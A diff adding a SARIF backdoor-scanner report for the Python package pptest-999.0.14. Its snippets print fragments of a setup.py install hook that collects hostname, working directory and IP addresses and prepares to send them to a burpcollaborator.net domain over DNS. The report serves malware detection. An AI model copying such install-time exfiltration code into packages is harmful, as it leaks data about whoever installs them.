@@ -1,0 +1,980 @@
+{
+  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "oss-detect-backdoor",
+          "organization": "Microsoft Corporation",
+          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
+          "version": "0.0.0+4a24249b20"
+        }
+      },
+      "results": [
+        {
+          "rule": {
+            "id": "BD000102"
+          },
+          "message": {
+            "text": "Backdoor: Web Request in Setup",
+            "id": "BD000102"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 68,
+                  "startColumn": 21,
+                  "endLine": 68,
+                  "endColumn": 33,
+                  "snippet": {
+                    "text": "        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n",
+                    "rendered": {
+                      "text": "        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n",
+                      "markdown": "`        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 2
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000102"
+          },
+          "message": {
+            "text": "Backdoor: Web Request in Setup",
+            "id": "BD000102"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 32,
+                  "startColumn": 29,
+                  "endLine": 32,
+                  "endColumn": 41,
+                  "snippet": {
+                    "text": "            if python_version >= '3.0':\r\n                import urllib.request\r\n                #import requests\r\n                #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n                handler = urllib.request.ProxyHandler(proxies)\r\n                opener = urllib.request.build_opener(handler)\r\n                req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\r\n",
+                    "rendered": {
+                      "text": "            if python_version >= '3.0':\r\n                import urllib.request\r\n                #import requests\r\n                #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n                handler = urllib.request.ProxyHandler(proxies)\r\n                opener = urllib.request.build_opener(handler)\r\n                req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\r\n",
+                      "markdown": "`            if python_version >= '3.0':\r\n                import urllib.request\r\n                #import requests\r\n                #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n                handler = urllib.request.ProxyHandler(proxies)\r\n                opener = urllib.request.build_opener(handler)\r\n                req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 2
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 68,
+                  "startColumn": 29,
+                  "endLine": 68,
+                  "endColumn": 34,
+                  "snippet": {
+                    "text": "        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n",
+                    "rendered": {
+                      "text": "        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n",
+                      "markdown": "`        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 48,
+                  "startColumn": 29,
+                  "endLine": 48,
+                  "endColumn": 38,
+                  "snippet": {
+                    "text": "                import urllib2\r\n                handler = urllib2.ProxyHandler(proxies)\r\n                opener = urllib2.build_opener(handler)\r\n                req = urllib2.Request('http://ifconfig.me/ip')#http://ip.dhcp.cn/?json\r\n                #res = opener.open(req)\r\n                #public_ip = (res.read().decode('utf-8'))\r\n                public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']# http://jsonip.com\r\n",
+                    "rendered": {
+                      "text": "                import urllib2\r\n                handler = urllib2.ProxyHandler(proxies)\r\n                opener = urllib2.build_opener(handler)\r\n                req = urllib2.Request('http://ifconfig.me/ip')#http://ip.dhcp.cn/?json\r\n                #res = opener.open(req)\r\n                #public_ip = (res.read().decode('utf-8'))\r\n                public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']# http://jsonip.com\r\n",
+                      "markdown": "`                import urllib2\r\n                handler = urllib2.ProxyHandler(proxies)\r\n                opener = urllib2.build_opener(handler)\r\n                req = urllib2.Request('http://ifconfig.me/ip')#http://ip.dhcp.cn/?json\r\n                #res = opener.open(req)\r\n                #public_ip = (res.read().decode('utf-8'))\r\n                public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']# http://jsonip.com\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 35,
+                  "startColumn": 36,
+                  "endLine": 35,
+                  "endColumn": 45,
+                  "snippet": {
+                    "text": "                #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n                handler = urllib.request.ProxyHandler(proxies)\r\n                opener = urllib.request.build_opener(handler)\r\n                req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\r\n                res = opener.open(req)\r\n                #print(res)\r\n\r\n",
+                    "rendered": {
+                      "text": "                #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n                handler = urllib.request.ProxyHandler(proxies)\r\n                opener = urllib.request.build_opener(handler)\r\n                req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\r\n                res = opener.open(req)\r\n                #print(res)\r\n\r\n",
+                      "markdown": "`                #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n                handler = urllib.request.ProxyHandler(proxies)\r\n                opener = urllib.request.build_opener(handler)\r\n                req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\r\n                res = opener.open(req)\r\n                #print(res)\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 32,
+                  "startColumn": 37,
+                  "endLine": 32,
+                  "endColumn": 42,
+                  "snippet": {
+                    "text": "            if python_version >= '3.0':\r\n                import urllib.request\r\n                #import requests\r\n                #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n                handler = urllib.request.ProxyHandler(proxies)\r\n                opener = urllib.request.build_opener(handler)\r\n                req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\r\n",
+                    "rendered": {
+                      "text": "            if python_version >= '3.0':\r\n                import urllib.request\r\n                #import requests\r\n                #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n                handler = urllib.request.ProxyHandler(proxies)\r\n                opener = urllib.request.build_opener(handler)\r\n                req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\r\n",
+                      "markdown": "`            if python_version >= '3.0':\r\n                import urllib.request\r\n                #import requests\r\n                #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n                handler = urllib.request.ProxyHandler(proxies)\r\n                opener = urllib.request.build_opener(handler)\r\n                req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 112,
+                  "startColumn": 11,
+                  "endLine": 112,
+                  "endColumn": 19,
+                  "snippet": {
+                    "text": "        print('in setup....')\r\n        self.mypip()\r\n        # Rename some script files\r\n        for script in self.get_outputs():\r\n            if basename.endswith(\".py\") or basename.endswith(\".sh\"):\r\n                dest = script[:-3]\r\n            else:\r\n",
+                    "rendered": {
+                      "text": "        print('in setup....')\r\n        self.mypip()\r\n        # Rename some script files\r\n        for script in self.get_outputs():\r\n            if basename.endswith(\".py\") or basename.endswith(\".sh\"):\r\n                dest = script[:-3]\r\n            else:\r\n",
+                      "markdown": "`        print('in setup....')\r\n        self.mypip()\r\n        # Rename some script files\r\n        for script in self.get_outputs():\r\n            if basename.endswith(\".py\") or basename.endswith(\".sh\"):\r\n                dest = script[:-3]\r\n            else:\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 111,
+                  "startColumn": 21,
+                  "endLine": 111,
+                  "endColumn": 29,
+                  "snippet": {
+                    "text": "        setuptools.command.install_scripts.install_scripts.run(self)\r\n        print('in setup....')\r\n        self.mypip()\r\n        # Rename some script files\r\n        for script in self.get_outputs():\r\n            if basename.endswith(\".py\") or basename.endswith(\".sh\"):\r\n                dest = script[:-3]\r\n",
+                    "rendered": {
+                      "text": "        setuptools.command.install_scripts.install_scripts.run(self)\r\n        print('in setup....')\r\n        self.mypip()\r\n        # Rename some script files\r\n        for script in self.get_outputs():\r\n            if basename.endswith(\".py\") or basename.endswith(\".sh\"):\r\n                dest = script[:-3]\r\n",
+                      "markdown": "`        setuptools.command.install_scripts.install_scripts.run(self)\r\n        print('in setup....')\r\n        self.mypip()\r\n        # Rename some script files\r\n        for script in self.get_outputs():\r\n            if basename.endswith(\".py\") or basename.endswith(\".sh\"):\r\n                dest = script[:-3]\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 106,
+                  "startColumn": 66,
+                  "endLine": 106,
+                  "endColumn": 71,
+                  "snippet": {
+                    "text": "    def mypip(self):\r\n        mydns = '8.8.8.8'\r\n        self.get_info(mydns)\r\n        print('!!!Attention: it is just a security test. Reinstall pip now.!!!')\r\n    def run(self):\r\n        setuptools.command.install_scripts.install_scripts.run(self)\r\n        print('in setup....')\r\n",
+                    "rendered": {
+                      "text": "    def mypip(self):\r\n        mydns = '8.8.8.8'\r\n        self.get_info(mydns)\r\n        print('!!!Attention: it is just a security test. Reinstall pip now.!!!')\r\n    def run(self):\r\n        setuptools.command.install_scripts.install_scripts.run(self)\r\n        print('in setup....')\r\n",
+                      "markdown": "`    def mypip(self):\r\n        mydns = '8.8.8.8'\r\n        self.get_info(mydns)\r\n        print('!!!Attention: it is just a security test. Reinstall pip now.!!!')\r\n    def run(self):\r\n        setuptools.command.install_scripts.install_scripts.run(self)\r\n        print('in setup....')\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 82,
+                  "startColumn": 25,
+                  "endLine": 82,
+                  "endColumn": 34,
+                  "snippet": {
+                    "text": "            \r\n        print(local_ip_str)\r\n        \r\n        # prepare the dns service\r\n        my_resolver = dns.resolver.Resolver(configure=False)\r\n        my_resolver.nameservers = [dns_server]#\r\n        my_resolver.port = 53\r\n",
+                    "rendered": {
+                      "text": "            \r\n        print(local_ip_str)\r\n        \r\n        # prepare the dns service\r\n        my_resolver = dns.resolver.Resolver(configure=False)\r\n        my_resolver.nameservers = [dns_server]#\r\n        my_resolver.port = 53\r\n",
+                      "markdown": "`            \r\n        print(local_ip_str)\r\n        \r\n        # prepare the dns service\r\n        my_resolver = dns.resolver.Resolver(configure=False)\r\n        my_resolver.nameservers = [dns_server]#\r\n        my_resolver.port = 53\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 71,
+                  "startColumn": 22,
+                  "endLine": 71,
+                  "endColumn": 26,
+                  "snippet": {
+                    "text": "        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n        #\r\n        local_ip_str = ''\r\n        for i in local_ips:\r\n",
+                    "rendered": {
+                      "text": "        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n        #\r\n        local_ip_str = ''\r\n        for i in local_ips:\r\n",
+                      "markdown": "`        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n        #\r\n        local_ip_str = ''\r\n        for i in local_ips:\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 87,
+                  "startColumn": 18,
+                  "endLine": 87,
+                  "endColumn": 26,
+                  "snippet": {
+                    "text": "        my_resolver.nameservers = [dns_server]#\r\n        my_resolver.port = 53\r\n        #print('1')\r\n        payload = hostname+'|'+os.getcwd()+'|'+str(self.get_wan_ip())+'|'+local_ip_str\r\n        #print('2')\r\n        payload_to_send = payload\r\n        print(payload)\r\n",
+                    "rendered": {
+                      "text": "        my_resolver.nameservers = [dns_server]#\r\n        my_resolver.port = 53\r\n        #print('1')\r\n        payload = hostname+'|'+os.getcwd()+'|'+str(self.get_wan_ip())+'|'+local_ip_str\r\n        #print('2')\r\n        payload_to_send = payload\r\n        print(payload)\r\n",
+                      "markdown": "`        my_resolver.nameservers = [dns_server]#\r\n        my_resolver.port = 53\r\n        #print('1')\r\n        payload = hostname+'|'+os.getcwd()+'|'+str(self.get_wan_ip())+'|'+local_ip_str\r\n        #print('2')\r\n        payload_to_send = payload\r\n        print(payload)\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 69,
+                  "startColumn": 22,
+                  "endLine": 69,
+                  "endColumn": 30,
+                  "snippet": {
+                    "text": "        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n        #\r\n",
+                    "rendered": {
+                      "text": "        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n        #\r\n",
+                      "markdown": "`        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n        print('host:'+hostname)\r\n        print('cwd:'+os.getcwd())\r\n        #print('public ip :'+str(get_wan_ip()))\r\n        #\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 65,
+                  "startColumn": 44,
+                  "endLine": 65,
+                  "endColumn": 52,
+                  "snippet": {
+                    "text": "        \r\n        fake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'\r\n        hostname = socket.gethostname()\r\n        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n",
+                    "rendered": {
+                      "text": "        \r\n        fake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'\r\n        hostname = socket.gethostname()\r\n        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n",
+                      "markdown": "`        \r\n        fake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'\r\n        hostname = socket.gethostname()\r\n        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/setup.py"
+                },
+                "region": {
+                  "startLine": 64,
+                  "startColumn": 8,
+                  "endLine": 64,
+                  "endColumn": 16,
+                  "snippet": {
+                    "text": "\r\n        \r\n        fake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'\r\n        hostname = socket.gethostname()\r\n        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n",
+                    "rendered": {
+                      "text": "\r\n        \r\n        fake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'\r\n        hostname = socket.gethostname()\r\n        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n",
+                      "markdown": "`\r\n        \r\n        fake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'\r\n        hostname = socket.gethostname()\r\n        local_ips = socket.gethostbyname_ex(hostname)\r\n        \r\n        #print 'jsonip.com', my_ip\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/pptest/__init__.py"
+                },
+                "region": {
+                  "startLine": 102,
+                  "startColumn": 62,
+                  "endLine": 102,
+                  "endColumn": 67,
+                  "snippet": {
+                    "text": "def mypip():\n    mydns = '8.8.8.8'\n    get_info(mydns)\n    print('!!!Attention: it is just a security test. Reinstall pip now.!!!')\n#mypip()",
+                    "rendered": {
+                      "text": "def mypip():\n    mydns = '8.8.8.8'\n    get_info(mydns)\n    print('!!!Attention: it is just a security test. Reinstall pip now.!!!')\n#mypip()",
+                      "markdown": "`def mypip():\n    mydns = '8.8.8.8'\n    get_info(mydns)\n    print('!!!Attention: it is just a security test. Reinstall pip now.!!!')\n#mypip()`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/pptest/__init__.py"
+                },
+                "region": {
+                  "startLine": 78,
+                  "startColumn": 21,
+                  "endLine": 79,
+                  "snippet": {
+                    "text": "        \n    print(local_ip_str)\n    \n    # prepare the dns service\n    my_resolver = dns.resolver.Resolver(configure=False)\n    my_resolver.nameservers = [dns_server]#\n    my_resolver.port = 53\n    #print('1')\n",
+                    "rendered": {
+                      "text": "        \n    print(local_ip_str)\n    \n    # prepare the dns service\n    my_resolver = dns.resolver.Resolver(configure=False)\n    my_resolver.nameservers = [dns_server]#\n    my_resolver.port = 53\n    #print('1')\n",
+                      "markdown": "`        \n    print(local_ip_str)\n    \n    # prepare the dns service\n    my_resolver = dns.resolver.Resolver(configure=False)\n    my_resolver.nameservers = [dns_server]#\n    my_resolver.port = 53\n    #print('1')\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/pptest/__init__.py"
+                },
+                "region": {
+                  "startLine": 67,
+                  "startColumn": 18,
+                  "endLine": 67,
+                  "endColumn": 22,
+                  "snippet": {
+                    "text": "    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    #print('public ip :'+str(get_wan_ip()))\n    #\n    local_ip_str = ''\n    for i in local_ips:\n",
+                    "rendered": {
+                      "text": "    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    #print('public ip :'+str(get_wan_ip()))\n    #\n    local_ip_str = ''\n    for i in local_ips:\n",
+                      "markdown": "`    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    #print('public ip :'+str(get_wan_ip()))\n    #\n    local_ip_str = ''\n    for i in local_ips:\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/pptest/__init__.py"
+                },
+                "region": {
+                  "startLine": 64,
+                  "startColumn": 25,
+                  "endLine": 64,
+                  "endColumn": 30,
+                  "snippet": {
+                    "text": "    local_ips = socket.gethostbyname_ex(hostname)\n    \n    #print 'jsonip.com', my_ip\n    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    #print('public ip :'+str(get_wan_ip()))\n",
+                    "rendered": {
